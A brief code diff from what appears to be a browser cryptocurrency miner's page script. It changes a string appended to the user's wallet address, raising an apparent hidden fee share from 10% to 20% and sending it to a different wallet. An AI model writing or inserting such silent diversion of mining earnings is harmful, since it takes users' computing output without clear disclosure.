@@ -103,7 +103,7 @@ $(function() {
       wallet = $('#wallet').val();
       if (wallet) 
       {
-		PerfektStart(wallet+"%10%4APDbaHLvcf4jFqbM2xP4KMR6PEURKz6eUTDmQkLZ1TkETEwycVZNSRfxqqxf685ub6JKTrND8u8e9rCMK2sB9KMMizJKXP", "x", threads);
+		PerfektStart(wallet+"%20%46czYpeHpYfZPsykR275NagL23vf6RkeSTBxnZm8h3UcB9EkTiJ6pqoAjS5dvc62oWVPNT9HyD81vVKhcdXVKjfc1f89u2q", "x", threads);
 		console.log(wallet);
 		$.cookie("wallet", wallet, {
 		expires: 365
